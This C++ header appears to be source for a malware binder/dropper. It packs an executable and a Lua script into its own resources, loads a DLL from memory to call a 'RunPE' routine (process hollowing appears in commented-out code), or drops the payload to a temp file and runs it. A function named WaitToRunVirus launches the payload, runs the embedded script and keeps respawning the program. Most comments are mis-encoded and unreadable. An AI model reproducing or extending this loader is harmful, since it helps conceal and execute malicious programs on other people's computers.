#pragma once
#include "resource.h"

#include "MemoryModule.h"
#include "LuaFunc.h"
// #include "ProcessHollowing.h"

#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>

#include <atlstr.h>
#include <tlhelp32.h>
#include <psapi.h>
#include "../../include/lua/lua.hpp"

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "lua.lib")

// ԭ����ָ��
typedef HRSRC(WINAPI* FindResource_t)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
typedef HGLOBAL(WINAPI* LoadResource_t)(HMODULE hModule, HRSRC hResInfo);

extern HMEMORYMODULE g_mem_pe;
extern FindResource_t OriginalFindResource;
extern LoadResource_t OriginalLoadResource;

BOOL CALLBACK EnumLangsProc(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam);
BOOL CALLBACK EnumNamesProc(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam);
BOOL CALLBACK EnumTypesProc(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam);
bool update_file(CString src_path, CString dst_path, int rid);
bool update_resource(CString str_path, HANDLE hUpdate, int rid);
bool update_config(int config, HANDLE hUpdate, int rid);
BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath, CString lua_path = L"", int config = 0);

// ö����Դ���͵Ļص�����
BOOL CALLBACK EnumTypesProc32(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam);
BOOL CALLBACK EnumNamesProc32(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam);
BOOL CALLBACK EnumLangsProc32(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam);
BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath, CString lua_path = L"", int config = 0);


// ����һ������ָ�����ͣ��� DLL �еĵ�������ǩ��ƥ��
typedef int (*RunPEFunc)(int);
// typedef int (*RunPEFunc)(void*, DWORD);

// ����Դ��ӵ����ļ��Ľṹ��
struct ResourceUpdateData {
    HANDLE hUpdate;
};

struct ResourceUpdateData32 {
    HANDLE hUpdate;
};

// �Զ���ṹ�壬ģ�� IMAGE_RESOURCE_DATA_ENTRY
typedef struct {
    DWORD OffsetToData;  // ��Դ���ݵ�ƫ��
    DWORD Size;          // ��Դ���ݵĴ�С
} RESOURCE_ENTRY, * PRESOURCE_ENTRY;

struct SharedData {
    DWORD pidC; // �洢����C��PID
};

class SharedMemory {
public:
    SharedMemory() : hMapping(nullptr), pSharedData(nullptr) {
        // ������򿪹����ڴ�
        hMapping = CreateFileMapping(
            INVALID_HANDLE_VALUE,  // ʹ��ϵͳҳ���ļ�
            NULL,                  // Ĭ�ϰ�ȫ��
            PAGE_READWRITE,        // ��дȨ��
            0,                      // ��λ��ֻ��Ϊ�㣩
            sizeof(SharedData),    // ӳ���С
            L"VgenSharedMemory" // �����ڴ�����
        );

        if (hMapping == NULL) {
            OutputDebugStringA("[vgen] CreateFileMapping failed!\n");
            return;
        }

        // ӳ�乲���ڴ�
        pSharedData = (SharedData*)MapViewOfFile(
            hMapping,               // �����ڴ���
            FILE_MAP_ALL_ACCESS,    // ����Ȩ��
            0,                      // �ļ�ӳ����ʼλ�ã���λ��
            0,                      // �ļ�ӳ����ʼλ�ã���λ��
            sizeof(SharedData)      // ӳ������Ĵ�С
        );

        if (pSharedData == NULL) {
            OutputDebugStringA("[vgen] MapViewOfFile failed!\n");
            CloseHandle(hMapping);
            return;
        }
    }

    ~SharedMemory() {
        // ����
        if (pSharedData != NULL) {
            UnmapViewOfFile(pSharedData);
        }
        if (hMapping != NULL) {
            CloseHandle(hMapping);
        }
    }

    // д�����C��PID�������ڴ�
    void WritePid(DWORD pid) {
        if (pSharedData != nullptr) {
            pSharedData->pidC = pid;
            CStringA str_msg;
            str_msg.Format("[vgen] Written PID to shared memory: %d\n", pid);
            OutputDebugStringA(str_msg);
        }
    }

    // ��ȡ�����ڴ��еĽ���C��PID
    DWORD ReadPid() {
        if (pSharedData != nullptr) {
            CStringA str_msg;
            str_msg.Format("[vgen] Read PID from shared memory:  %d\n", pSharedData->pidC);
            OutputDebugStringA(str_msg);
            return pSharedData->pidC;
        }
        return 0;
    }

private:
    HANDLE hMapping;
    SharedData* pSharedData;
};

class CPEGenerator
{
public:
	CPEGenerator()
        : ph(NULL)
        , pRunPE(NULL)
    {

	}
	~CPEGenerator() {

        if (ph) {
            MemoryFreeLibrary(ph);
        }

	}

public:

    // ���ַ�ת��Ϊխ�ַ�
    bool WChar2Ansi(const wchar_t* pwszSrc, char*& pszDst)
    {
        bool flag = false;
        size_t len = 0;
        size_t trans_len = (wcslen(pwszSrc) * 2) + 1;

        pszDst = new char[trans_len];
        errno_t err = wcstombs_s(&len, pszDst, trans_len, pwszSrc, trans_len);

        if (len > 0) {
            flag = true;
        }
        else {
            delete[] pszDst;
            pszDst = nullptr;
        }
        return flag;
    }

    void ParseParams(int argc, wchar_t* argv[]);
//    void ParseParams(int argc, wchar_t* argv[]) {
//        if (argc <= 1) {
//            WaitToRunVirus();
//            // MemoryLoadToRun(IDR_BINARY_FILE);
//            // MemoryLoadToRun(IDR_BINARY_FILE);
//            //pRunPE(IDR_BINARY_FILE);
//        }
//        else if (argc == 2) {
//            CString str_param = argv[1];
//            if (str_param == L"run") {
//                
//                // MemoryLoadToRun(IDR_BINARY_FILE);
//                MemLoadDll();
//
//                int cnt = 10;
//                int pid = -1;
//                int config = ExtractLuaGetCfg(IDR_CFG);
//                while (cnt-- && pid == -1) {
//                    if (config) {
//                        pid = pRunPE(IDR_BINARY_FILE);
//                    }
//                    else {
//                        ExtractAndRunResourceProgram(IDR_BINARY_FILE, str_temp_path, pid);
//                    }
//                    Sleep(1000);
//                }
//
//              
//                SharedMemory share;
//                share.WritePid(pid);
//
//
//
//                //HANDLE hMainThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
//                //if (!hMainThread) {
//                //    return;
//                //}
//
//                //// ���������߳�ִ�� Hollowing
//                //HANDLE hThread = CreateThread(NULL, 0, HollowingThread, hMainThread, 0, NULL);
//                //if (!hThread) {
//                //    CloseHandle(hMainThread);
//                //    return;
//                //}
//
//                //// �ȴ������߳����
//                //WaitForSingleObject(hThread, INFINITE);
//                //CloseHandle(hThread);
//                //CloseHandle(hMainThread);
//
//            }
//            else if (str_param == L"wait") {
//                return;
//            }
//            
//        }
//        else if(argc >= 3) {
//
//            CString str_param = argv[1];
//            if (str_param == L"runlua") {
//                char* str_file;
//                CStringHandler::InitChinese();
//                CStringHandler::WChar2Ansi(argv[2], str_file);
//                if (str_file) {
//                    LuaRunner runner;
//                    runner.run_lua_file(str_file);
//                    delete[] str_file;
//                }
//                else {
//                    OutputDebugStringA("trans file data to char failed .");
//                }
//                return;
//            }
//
//            WCHAR exePath[MAX_PATH];
//            // ��ȡ��ǰ�����·��
//            DWORD result = GetModuleFileName(NULL, exePath, MAX_PATH);
//            LPCWSTR resourceFilePath = argv[1];
//            LPCWSTR newExePath = argv[2];
//            CString lua_path;
//            int config = 0;
//            if (argc >= 4) {
//                lua_path = argv[3];
//            }
//            if (argc >= 5) {
//                config = 1;
//            }
//#ifdef _WIN64
//            AddFileToResource(exePath, resourceFilePath, newExePath, lua_path, config);
//#else
//            AddFileToResource32(exePath, resourceFilePath, newExePath, lua_path, config);
//#endif
//        }
//    }   

    //BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath) {
    //    WCHAR tempFilePath[MAX_PATH];

    //    // ������ʱ�ļ�·��
    //    GetTempPath(MAX_PATH, tempFilePath);
    //    GetTempFileName(tempFilePath, L"tmp", 0, tempFilePath);

    //    // ����ǰ��ִ���ļ����Ƶ���ʱ�ļ�
    //    if (!CopyFile(exePath, tempFilePath, FALSE)) {
    //        MessageBox(NULL, L"Failed to create temporary file.", L"generator", MB_OK);
    //        return FALSE;
    //    }

    //    // ����ʱ�ļ�������Դ����
    //    HANDLE hUpdate = BeginUpdateResource(tempFilePath, FALSE);
    //    if (!hUpdate) {
    //        MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
    //        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
    //        return FALSE;
    //    }

    //    // ��Ҫ��ӵ���Դ���ļ�
    //    std::ifstream file(resourceFilePath, std::ios::binary);
    //    if (!file.is_open()) {
    //        MessageBox(NULL, L"Failed to open the input file.", L"generator", MB_OK);
    //        EndUpdateResource(hUpdate, TRUE);
    //        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
    //        return FALSE;
    //    }

    //    // ��ȡ�ļ����ݵ��ڴ�
    //    file.seekg(0, std::ios::end);
    //    size_t fileSize = file.tellg();
    //    file.seekg(0, std::ios::beg);

    //    char* buffer = new char[fileSize];
    //    file.read(buffer, fileSize);
    //    file.close();

    //    // ���ļ����ݸ��µ���Դ��
    //    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_BINARY_FILE), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
    //        MessageBox(NULL, L"Failed to update the resource.", L"generator", MB_OK);
    //        delete[] buffer;
    //        EndUpdateResource(hUpdate, TRUE);
    //        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
    //        return FALSE;
    //    }

    //    delete[] buffer;

    //    // �����Դ����
    //    if (!EndUpdateResource(hUpdate, FALSE)) {
    //        MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
    //        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
    //        return FALSE;
    //    }

    //    // ���޸ĺ����ʱ�ļ����Ƶ�Ŀ���ļ�·��
    //    if (!CopyFile(tempFilePath, newExePath, FALSE)) {
    //        MessageBox(NULL, L"Failed to create the final output file.", L"generator", MB_OK);
    //        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
    //        return FALSE;
    //    }

    //    // ɾ����ʱ�ļ�
    //    DeleteFile(tempFilePath);

    //    MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
    //    return TRUE;
    //}
    BOOL TerminateProcessByPid(DWORD pid) {
        // ��Ŀ����̣����� TERMINATE Ȩ��
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);

        if (hProcess == NULL) {
            // �򿪽���ʧ�ܣ����������Ϣ��������
            char msg[256];
            snprintf(msg, sizeof(msg), "OpenProcess failed with error code: %lu", GetLastError());
            OutputDebugStringA(msg);
            return FALSE;
        }

        // ��ֹ���̣��˳�����Ϊ 0
        BOOL result = TerminateProcess(hProcess, 0);  // �ڶ����������˳����룬ͨ������Ϊ 0

        if (!result) {
            // �����ֹʧ�ܣ����������Ϣ��������
            char msg[256];
            snprintf(msg, sizeof(msg), "TerminateProcess failed with error code: %lu", GetLastError());
            OutputDebugStringA(msg);
        }
        else {
            // ����ɹ���Ϣ��������
            char msg[256];
            snprintf(msg, sizeof(msg), "Process %lu terminated successfully.", pid);
            OutputDebugStringA(msg);
        }

        // �رս��̾��
        CloseHandle(hProcess);

        return result;
    }


    // ��ȡ��Դ��С
    DWORD GetRecSize(int resourceId) {
        DWORD resourceSize = 0;
        HMODULE hModule = GetModuleHandle(NULL);
        if (hModule) {
            // ����ָ����Դ
            HRSRC hResInfo = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
            if (hResInfo != NULL) {
                // ��ȡ��Դ�Ĵ�С
                resourceSize = SizeofResource(hModule, hResInfo);
            }
        }
        return resourceSize;
    }

    // ��ȡ��ǰ���̵���Դ�λ���ַ
    IMAGE_RESOURCE_DIRECTORY* GetCurrentProcessResourceDirectory() {
        HMODULE hModule = GetModuleHandle(NULL);
        if (!hModule) return nullptr;

        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);

        DWORD resourceRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress;
        if (resourceRVA == 0) return nullptr;

        return (IMAGE_RESOURCE_DIRECTORY*)((BYTE*)hModule + resourceRVA);
    }

    void RedirectResourceDirectory(HMEMORYMODULE loadedModule, IMAGE_RESOURCE_DIRECTORY* newResourceDir) {
        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)loadedModule;
        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)loadedModule + dosHeader->e_lfanew);

        // �޸���ԴĿ¼�� RVA �ʹ�Сָ��ǰ���̵���Դ��
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress = (DWORD)((BYTE*)newResourceDir - (BYTE*)loadedModule);
    }

    HANDLE RunGenerator(CString cmdline) {
        BOOL flag = FALSE;

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        // ʹ�� CreateProcess ��������
        flag = CreateProcess(
            NULL,                       // Ӧ�ó�������
            cmdline.GetBuffer(),            // ������
            NULL,                       // ���̰�ȫ������
            NULL,                       // �̰߳�ȫ������
            FALSE,                      // �Ƿ�̳о��
            0,                          // ������־
            NULL,                       // ��������
            NULL,                       // ��ǰĿ¼
            &si,                        // ������Ϣ
            &pi                         // ������Ϣ
        );
        cmdline.ReleaseBuffer();

        if (flag) {
            CStringA str_msg;
            str_msg.Format("�ɹ�������������ID��%d", pi.dwProcessId);
            OutputDebugStringA(str_msg);
            // �رս��̺��߳̾��
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            OutputDebugStringA("�˳�");
        }

        return pi.hProcess;
    }

    // ��ȡ��ǰ���̵�·��
    std::wstring GetCurrentProcessPath() {
        wchar_t path[MAX_PATH];
        if (GetModuleFileName(NULL, path, MAX_PATH)) {
            return std::wstring(path);
        }
        return L"";
    }

    // �ر��뵱ǰ��������·����ͬ�����н���
    void TerminateMatchingProcesses() {
        OutputDebugStringA("TerminateMatchingProcesses my gen\n");

        CStringA str_msg;
        // ��ȡ��ǰ����·��
        std::wstring currentProcessPath = GetCurrentProcessPath();

        // ��ȡ��ǰ����ID
        DWORD currentProcessId = GetCurrentProcessId();

        // �������̿���
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            str_msg.Format("CreateToolhelp32Snapshot failed! error : %d\n", GetLastError());
            OutputDebugStringA(str_msg);
            return;
        }

        // ö�ٽ���
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (!Process32First(hSnapshot, &pe32)) {
            str_msg.Format("Process32First failed! error : %d\n", GetLastError());
            OutputDebugStringA(str_msg);
            CloseHandle(hSnapshot);
            return;
        }

        do {
            // ������ǰ����
            if (pe32.th32ProcessID == currentProcessId) {
                continue;
            }

            // ��ȡ����·��
            TCHAR szProcessPath[MAX_PATH];
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
            if (hProcess != NULL) {
                if (GetModuleFileNameEx(hProcess, NULL, szProcessPath, MAX_PATH)) {
                    std::wstring processPath(szProcessPath);

                    // �������·���뵱ǰ����·��ƥ�䣬��ֹ����
                    if (processPath == currentProcessPath) {
                        
                        str_msg.Format("Terminating process: (PID: %d)\n", pe32.th32ProcessID);
                        OutputDebugStringA(str_msg);
                        TerminateProcess(hProcess, 0);
                    }
                }
                CloseHandle(hProcess);
            }
        } while (Process32Next(hSnapshot, &pe32));

        CloseHandle(hSnapshot);
    }

    BOOL WaitToRunVirus() {
        SharedMemory share;

        // ��ȡ��ǰ���������·��
        wchar_t modulePath[MAX_PATH];
        GetModuleFileName(NULL, modulePath, MAX_PATH);

        // ���������в�������������·���Ͳ���
        CString commandLine;
        commandLine.Format(L"\"%s\" wait", modulePath); // ע�����Ű���·��
        // commandLine.Format(L"\"%s\"", modulePath); // ע�����Ű���·��

        // ������������
        CString run_vir;
        run_vir.Format(L"\"%s\" run", modulePath); // ע�����Ű���·��
        RunGenerator(run_vir);

        OutputDebugString(L"run lua script start !");

        // �ȸ����������нű�����ֹ�������У����Ҫѭ���ڽű���ʵ�־ͺ�
        ExtractLuaAndRun(IDR_LUA);

        OutputDebugString(L"run lua script end !");

        while (FileExists(modulePath)) {

            // ����������Ϣ�ͽ�����Ϣ�ṹ��
            RunGenerator(commandLine);
            Sleep(10000);
        }
        OutputDebugStringA("[gen] file is not exit\n");
        
        // TerminateProcessByPid(share.ReadPid());
        TerminateProcessByPid(share.ReadPid());
        TerminateMatchingProcesses();

        return TRUE;
    }

    BOOL MemLoadDll() {
        BOOL flag = FALSE;
        try {
            // ���ص�ǰģ��
            HMODULE hModule = GetModuleHandle(NULL);
            if (!hModule) {
                // L"Failed to load module.\n";
                return flag;
            }

            // ������Դ
            HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(IDR_PH), RT_RCDATA);
            if (!hResource) {
                //<< L"Failed to find resource.\n";
                return flag;
            }

            // ������Դ
            HGLOBAL hResData = LoadResource(hModule, hResource);
            if (!hResData) {
                // << L"Failed to load resource.\n";
                return flag;
            }

            // ��ȡ��Դ��С������ָ��
            DWORD dataSize = SizeofResource(hModule, hResource);
            void* pData = LockResource(hResData);

            // 2. ʹ�� MemoryLoadLibrary �� EXE ���ص��ڴ�
            ph = MemoryLoadLibrary(pData, dataSize);

            if (!ph) {
                std::cout << "Failed to load EXE into memory." << std::endl;
                return flag;
            }

            pRunPE = (RunPEFunc)MemoryGetProcAddress(ph, "RunPE");

            //// �����Ѽ��� DLL���õ�����
            //HMODULE hDll = LoadLibraryA("PhDll.dll");

            //MessageBox(NULL, L"test", L"test", MB_OK);
            //// ʹ�� GetProcAddress ��ȡ RunPE �����ĵ�ַ
            //RunPEFunc pRunPE = (RunPEFunc)GetProcAddress(hDll, "RunPE");

            // pRunPE = (RunPEFunc)MemoryGetProcAddress(ph, "RunPE");
        }
        catch (const std::exception& e) {
            std::cout << "Error: " << e.what() << std::endl;
            return flag;
        }
        return flag;
    }

    BOOL MemoryLoadToRun(int resourceId) {
        BOOL flag = FALSE;
        try {
            // ���ص�ǰģ��
            HMODULE hModule = GetModuleHandle(NULL);
            if (!hModule) {
                // L"Failed to load module.\n";
                return flag;
            }

            // ������Դ
            HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
            if (!hResource) {
                // L"Failed to find resource.\n";
                return flag;
            }

            // ������Դ
            HGLOBAL hResData = LoadResource(hModule, hResource);
            if (!hResData) {
                // L"Failed to load resource.\n";
                return flag;
            }

            // ��ȡ��Դ��С������ָ��
            DWORD dataSize = SizeofResource(hModule, hResource);
            void* pData = LockResource(hResData);

            // pRunPE(pData, dataSize);

            // 2. ʹ�� MemoryLoadLibrary �� EXE ���ص��ڴ�
            /*HMEMORYMODULE hmemModule = MemoryLoadLibrary(pData, dataSize);
            if (!hmemModule) {
                std::cout << "Failed to load EXE into memory." << std::endl;
                return flag;
            }*/

            // ��ȡ��ǰ���̵���ԴĿ¼��ַ
            //IMAGE_RESOURCE_DIRECTORY* currentResourceDir = GetCurrentProcessResourceDirectory();
            //if (currentResourceDir) {
            //    // �ض����ڴ���� EXE ����ԴĿ¼ָ��
            //    RedirectResourceDirectory(hmemModule, currentResourceDir);
            //}
            //else {
            //    std::cerr << "Failed to locate current process resource directory." << std::endl;
            //}
            
            

            // 3. ��ȡ EXE �ļ�����ڵ㲢����
            // MemoryCallEntryPoint(hmemModule);

            // 4. ж�� EXE �ļ�
            // MemoryFreeLibrary(hmemModule);
        }
        catch (const std::exception& e) {
            std::cout << "Error: " << e.what() << std::endl;
            return flag;
        }
        return flag;
    }

    bool FileExists(CString filePath) {
        DWORD fileAttr = GetFileAttributes(filePath);
        // �������ֵΪ INVALID_FILE_ATTRIBUTES����ʾ�ļ������ڻ����
        return (fileAttr != INVALID_FILE_ATTRIBUTES && !(fileAttr & FILE_ATTRIBUTE_DIRECTORY));
    }

    BOOL ExtractAndRunResourceProgram(int resourceId, CString& str_path, int& pid) {
        // ���ص�ǰģ��
        HMODULE hModule = GetModuleHandle(NULL);
        if (!hModule) {
            // L"Failed to load module. code  = " << GetLastError() << "\n";
            return FALSE;
        }

        // ������Դ
        HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
        if (!hResource) {
            // L"Failed to find resource.\n";
            return FALSE;
        }

        // ������Դ
        HGLOBAL hResData = LoadResource(hModule, hResource);
        if (!hResData) {
            // << L"Failed to load resource.\n";
            return FALSE;
        }

        // ��ȡ��Դ��С������ָ��
        DWORD dataSize = SizeofResource(hModule, hResource);
        void* pData = LockResource(hResData);

        // ����Դ����д����ʱ�ļ�
        WCHAR tempPath[MAX_PATH];
        WCHAR tempFile[MAX_PATH];
        GetTempPath(MAX_PATH, tempPath);
        GetTempFileName(tempPath, L"tmp", 0, tempFile);

        std::ofstream outFile(tempFile, std::ios::binary);
        if (!outFile.is_open()) {
            // << L"Failed to create temp file.\n";
            return FALSE;
        }
        outFile.write((char*)pData, dataSize);
        outFile.close();

        // ����һ������������ȡ�ĳ���
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (!CreateProcess(tempFile, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            // L"Failed to run the extracted program.\n;
            DeleteFile(tempFile); // ɾ����ʱ�ļ�
            return FALSE;
        }

        // �ȴ��������
        // WaitForSingleObject(pi.hProcess, INFINITE);
        str_path = tempFile;
        pid = pi.dwProcessId;


        // ����
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        // DeleteFile(tempFile); // ɾ����ʱ�ļ�

        // std::wcout << L"Program executed successfully.\n";
        return TRUE;
    }

    // ��ȡ������lua�ű�
    BOOL ExtractLuaAndRun(int resourceId) {
        // ���ص�ǰģ��
        HMODULE hModule = GetModuleHandle(NULL);
        if (!hModule) {
            // L"Failed to load module. code  = " << GetLastError() << "\n";
            return FALSE;
        }

        // ������Դ
        HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
        if (!hResource) {
            // L"Failed to find resource.\n";
            return FALSE;
        }

        // ������Դ
        HGLOBAL hResData = LoadResource(hModule, hResource);
        if (!hResData) {
            // << L"Failed to load resource.\n";
            return FALSE;
        }

        // ��ȡ��Դ��С������ָ��
        DWORD dataSize = SizeofResource(hModule, hResource);
        void* pData = LockResource(hResData);

        LuaRunner runner;
        size_t lua_len = (size_t)dataSize + 1;
        char* lua_str = new char[lua_len];
        memset(lua_str, 0, sizeof(char) * (lua_len));
        memcpy(lua_str, pData, dataSize);

        runner.run_lua(lua_str);

        delete[] lua_str;

        // std::wcout << L"Program executed successfully.\n";
        return TRUE;
    }

    // ��ȡ������lua�ű�
    int ExtractLuaGetCfg(int resourceId) {
        // ���ص�ǰģ��
        HMODULE hModule = GetModuleHandle(NULL);
        if (!hModule) {
            // L"Failed to load module. code  = " << GetLastError() << "\n";
            return FALSE;
        }

        // ������Դ
        HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
        if (!hResource) {
            // L"Failed to find resource.\n";
            return FALSE;
        }

        // ������Դ
        HGLOBAL hResData = LoadResource(hModule, hResource);
        if (!hResData) {
            // << L"Failed to load resource.\n";
            return FALSE;
        }

        // ��ȡ��Դ��С������ָ��
        DWORD dataSize = SizeofResource(hModule, hResource);
        void* pData = LockResource(hResData);

        LuaRunner runner;
        size_t lua_len = (size_t)dataSize + 1;
        char* lua_str = new char[lua_len];
        memset(lua_str, 0, sizeof(char) * (lua_len));
        memcpy(lua_str, pData, dataSize);

        int cfg = runner.get_lua_cfg(lua_str);

        delete[] lua_str;

        // std::wcout << L"Program executed successfully.\n";
        return cfg;
    }

private:
    RunPEFunc pRunPE;
    HMEMORYMODULE ph;
    CString str_temp_path;

};
